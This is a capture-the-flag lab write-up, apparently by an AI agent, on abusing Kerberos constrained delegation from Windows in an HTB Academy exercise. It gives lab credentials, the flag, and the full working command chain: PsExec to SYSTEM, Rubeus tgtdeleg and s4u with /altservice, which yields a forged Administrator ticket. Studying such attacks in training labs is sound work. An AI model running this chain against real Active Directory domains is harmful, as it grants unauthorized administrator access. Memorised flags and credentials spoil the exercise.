# Constrained Delegation Overview & Attacking from Windows

**Module:** HTB Academy — Kerberos Attacks
**Entry point:** `ACADEMY-KERBATTCK-WS01` (10.129.205.26, port **13389** → forwarded to DMZ01), domain `INLANEFREIGHT.LOCAL`
**Given access:** `carole.holmes` / `Y3t4n0th3rP4ssw0rd`
**Goal:** read `C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt`

**Result:** `Constrained_D3L3g4t10N_Fr0M_W1n2` — Administrator-equivalent (CIFS/HOST/etc.) access on WS01 via constrained delegation abuse of the DMZ01 machine account, all from a GUI RDP session, no non-Windows tooling.

---

## 1. Attack chain (summary)

1. RDP straight to WS01's IP on port **3389** as `carole.holmes` → denied (no "Allow log on through Remote Desktop Services" right). RDP to the **same IP, port 13389** instead → lands on **DMZ01**'s desktop (a pre-configured port-forward exposed by the lab, not WS01 itself).
2. `carole.holmes` is a local **Administrator on DMZ01**, but her RDP logon token is UAC-filtered (Medium integrity, no admin privileges by default).
3. Elevate via UAC (`Start-Process powershell -Verb RunAs`) — no credential prompt since she's already in `Administrators`, just a consent click.
4. Enumerate delegation with PowerView (already in `C:\Tools`): `DMZ01$` (the computer account) has **constrained delegation** to `www/WS01.INLANEFREIGHT.LOCAL`.
5. The computer account `DMZ01$`'s own Kerberos identity is only usable from a **SYSTEM** context, not from an elevated-but-still-`carole.holmes` shell. Get SYSTEM with `PsExec.exe -s -i powershell.exe` (works because she's local admin).
6. From SYSTEM, `Rubeus.exe tgtdeleg` grabs a *real* TGT for `DMZ01$` (the "fake delegation" trick: ask LSA for a delegatable ticket for "the current logon" — and under SYSTEM, the current logon identity *is* the machine account).
7. `Rubeus.exe s4u` with that TGT: S4U2Self (impersonate Administrator) + S4U2Proxy (request a service ticket to the allowed SPN), then swap the service class via `/altservice` to pivot from `www` to `cifs`/`host`/etc. — constrained delegation only checks the target **hostname**, not the service class, so this grants a usable Administrator ticket for any service on WS01.
8. Inject with `/ptt`, then simply `type \\WS01...\C$\...\flag.txt` using the forged ticket.

---

## 2. Where I got stuck (and the actual fixes)

### 2.1 Direct RDP to WS01 (port 3389) — genuinely blocked, not a bug

```
xfreerdp3 /v:10.129.205.26 /u:carole.holmes /d:INLANEFREIGHT.LOCAL /p:... /cert:ignore
...
[ERROR][com.freerdp.core.nla] - Early User Auth active: FAILURE authorization result 0x00000005
[ERROR][com.freerdp.core] - ERRCONNECT_ACCESS_DENIED
```

Verified independently with `nxc rdp` and `nxc winrm` — both confirm the **password is correct** (NTLM handshake completes fully, `SEC_E_OK`) but the server's own *authorization* step rejects it. Forcing the legacy RDP Security Layer (`/sec:rdp`, no NLA) got a server-side connection reset instead (server requires NLA). Submitting the password for real at the GUI logon screen (via `/sec:tls` to skip CredSSP's own pre-check) confirmed the actual Windows error text:

> "To sign in remotely, you need the right to sign in through Remote Desktop Services. By default, members of the Remote Desktop Users group have this right..."

So: `carole.holmes` is simply not in `Remote Desktop Users` (or equivalent) on WS01 directly. Not a FreeRDP quirk, not a wrong domain/realm issue (those were separate, earlier red herrings — see §2.2).

### 2.2 FreeRDP tries Kerberos against the wrong realm by default

Early attempts failed with:
```
[ERROR][com.winpr.sspi.Kerberos] - krb5_init_creds_get (Client 'carole.rose@ATHENA.MIT.EDU' not found in Kerberos database)
```
FreeRDP falls back to the local `/etc/krb5.conf` default realm (`ATHENA.MIT.EDU`, MIT's own doc example!) when it can't otherwise resolve one, instead of just trying NTLM. Fix: force NTLM only via `/auth-pkg-list:none,ntlm` (syntax matters: `none` first to disable every package, then re-enable the ones you want — passing `!kerberos,ntlm` alone did *not* reliably suppress the Kerberos attempt).

### 2.3 The actual unlock: read the question text literally

> "Connect to the target machine via RDP on **port 13389** to access DMZ01..."

This was *not* "RDP to WS01, then from inside RDP again to DMZ01" — it meant: the exact same IP already given, but a **different TCP port** (13389) that's a raw port-forward straight into DMZ01's RDP service (3389). `nc`/bash `/dev/tcp` confirmed `13389` open on `10.129.205.26` while `3389` there is WS01's own (denied) RDP. Once pointed at `:13389` with the exact same `carole.holmes` credential, NLA negotiation succeeded immediately — no further `ACCESS_DENIED`, because this is a different machine (DMZ01) where she *does* have RDP rights.

### 2.4 xdotool clicks landing on the wrong window — screen vs. window coordinates

`xdotool mousemove <x> <y>` takes **absolute screen coordinates**, but I was computing click targets from a screenshot taken with `import -window <id>` (i.e., coordinates *relative to that window's content*, starting at 0,0 regardless of where the window actually sits on the real desktop). Clicks landed on the terminal/Server Manager menu instead of the RDP session's taskbar, closing windows and opening menus I didn't intend.

Fix: `xdotool getwindowgeometry --shell <window_id>` gives the window's real `X`/`Y` offset; add that to every coordinate read off a window-scoped screenshot before clicking. (`import -window root` instead, for a full-screen capture, sidesteps this entirely — useful for a quick sanity check, but a window-scoped capture is cleaner once you're tracking one specific RDP window across many screenshots.)

### 2.5 `xdotool key super` / typing into "search" didn't reliably open anything

Pressing the Windows key and then typing a program name (`cmd`, etc.) sometimes landed keystrokes on the wrong window (e.g., individual letters triggering menu mnemonics in Server Manager — `m` opened its "Manage" menu). More reliable: press `super` alone, screenshot to confirm the Start menu is actually open and focused, then **click a visible tile directly** (e.g., the "Windows PowerShell" tile) rather than typing into a search box that may not have keyboard focus over an RDP session.

### 2.6 `type C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt` → "Cannot find path... because it does not exist"

Expected at that point — this was run as plain `carole.holmes` on **DMZ01**, before any delegation abuse. Confirmed we actually needed to use the constrained-delegation chain ("repeat the steps shown previously") rather than just browsing to the file directly.

### 2.7 Rubeus `s4u` with a `tgtdeleg` ticket obtained as `carole.holmes` fails

```
[*] Building S4U2self request for: 'carole.holmes@INLANEFREIGHT.LOCAL'
[X] KRB-ERROR (7) : KDC_ERR_S_PRINCIPAL_UNKNOWN
[X] S4U2Self failed, unable to perform S4U2Proxy.
```
`Rubeus.exe tgtdeleg` doesn't get you an arbitrary account's TGT — it asks the LSA for a *delegatable ticket belonging to whatever identity the current process is running as*. Running it as `carole.holmes` (even from an elevated-but-still-her-own shell) gives back **her own** TGT. She isn't a delegation-trusted principal, so S4U2Self on her behalf is rejected outright by the KDC — this has nothing to do with constrained delegation configuration; any non-trusted account gets this same error.

The actual delegation-trusted principal here is the **computer account** `DMZ01$`. Its Kerberos identity is only "current" when the process itself is running as the machine account/SYSTEM. Fix: get a SYSTEM shell first (`PsExec.exe -s -i powershell.exe`, which only works because `carole.holmes` is local admin on DMZ01 — confirmed with `net localgroup administrators` after the first UAC-filtered session showed a deceptively low-privilege `whoami /priv`), **then** run `tgtdeleg` again. Same command, different process identity, correct result:
```
PS (as carole.holmes, elevated)> whoami
PS C:\Windows\system32>            # looked unprivileged — but
net localgroup administrators      # confirmed carole.holmes IS in Administrators;
                                    # it's just UAC token-filtering, not a real restriction.
```

### 2.8 Typing a 2000+ character base64 Kerberos ticket by hand is a bad idea

Rather than `xdotool type`-ing a huge base64 blob (error-prone, and Rubeus's `tgtdeleg` output has to be re-run anyway once you're SYSTEM), the whole `tgtdeleg` → extract-ticket → `s4u` sequence was written as a small **PowerShell script on the Linux side**, copied to the Windows clipboard with `xclip -selection clipboard` (RDP's `+clipboard` redirection carries it over), pasted into Notepad inside the session, saved as `.ps1`, and executed with `powershell -ep bypass -File ...`. This avoids both manual retyping and copy errors, and means the automation step (extracting the base64 ticket from `Rubeus.exe tgtdeleg`'s console output via regex) runs natively in PowerShell instead of trying to parse it by eye off a screenshot.

```powershell
$out = & C:\Tools\Rubeus.exe tgtdeleg /nowrap
$b64 = ($out | Select-String '^\s*do[A-Za-z0-9+/=]+\s*$' | ForEach-Object { $_.Line.Trim() }) -join ''
& C:\Tools\Rubeus.exe s4u /ticket:$b64 /impersonateuser:Administrator `
    /msdsspn:"www/WS01.INLANEFREIGHT.LOCAL" /altservice:cifs,host,http,rpcss,wsman,ldap /ptt
```

### 2.9 Background shell processes dying between tool calls (environment note, not HTB-specific)

Separate from the RDP/Kerberos chain: any Linux-side background process started with plain `cmd &`/`nohup cmd &` inside one sandboxed shell call does **not** survive into the next call — it gets torn down with the shell session. Long-lived listeners (e.g. an earlier module's `krbrelayx.py`) have to be started via the harness's own background-task mechanism, not shell-level `&`. Not relevant to the Windows side of this attack, but cost real time before being diagnosed, so noting it here too.

---

## 3. Full command sequence (as actually run)

```powershell
# On DMZ01, as carole.holmes (elevated via UAC):
net localgroup administrators                     # confirm she's really local admin

C:\Tools\PsExec.exe -accepteula -s -i powershell.exe   # -> SYSTEM shell (identity = DMZ01$)

# In the SYSTEM shell:
whoami                                             # NT AUTHORITY\SYSTEM

Import-Module C:\Tools\PowerView.ps1
Get-DomainComputer -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
# DMZ01$   {www/WS01.INLANEFREIGHT.LOCAL, www/WS01}

# s4u.ps1 (pasted via clipboard, saved, then run):
$out = & C:\Tools\Rubeus.exe tgtdeleg /nowrap
$b64 = ($out | Select-String '^\s*do[A-Za-z0-9+/=]+\s*$' | ForEach-Object { $_.Line.Trim() }) -join ''
& C:\Tools\Rubeus.exe s4u /ticket:$b64 /impersonateuser:Administrator `
    /msdsspn:"www/WS01.INLANEFREIGHT.LOCAL" /altservice:cifs,host,http,rpcss,wsman,ldap /ptt

klist
# Client: Administrator @ INLANEFREIGHT.LOCAL
# Server: cifs/WS01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL   <- forged, usable

type \\WS01.INLANEFREIGHT.LOCAL\C$\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt
# Constrained_D3L3g4t10N_Fr0M_W1n2
```

---

## 4. Flag

**`Constrained_D3L3g4t10N_Fr0M_W1n2`**

---

## 5. Key takeaways

- **A machine account's own constrained delegation only "activates" under that machine's own Kerberos identity** — a local-admin *human* account on the same box is not the same thing. You need an actual SYSTEM (or service-account) context before `Rubeus tgtdeleg` is useful for abusing a computer account's `msDS-AllowedToDelegateTo`.
- **Constrained delegation checks the target host, not the service class** — once the KDC hands you an S4U2Proxy ticket for *one* SPN on a box, `/altservice` lets you relabel it for CIFS/HOST/HTTP/etc. on that same host, turning a narrow "web service" delegation into effectively full remote access.
- **UAC token filtering looks identical to "not actually an admin" from `whoami /priv`** — always double-check real group membership (`net localgroup administrators`) before concluding a local-admin account has no useful rights; an elevation prompt (not a credential prompt) is the tell that it's filtering, not restricting.
- **Read coercion/pivot instructions literally.** "Connect via RDP on port 13389" meant a literal alternate TCP port on the *same* IP, not a second hop through an already-open session. Confirming open ports with `/dev/tcp` before assuming an account's rights are wrong saved a lot of wasted retries.
- Treat captured Kerberos tickets and forged credentials as sensitive, ephemeral material — used only inside the already-authorized lab session here, never exported or logged externally.
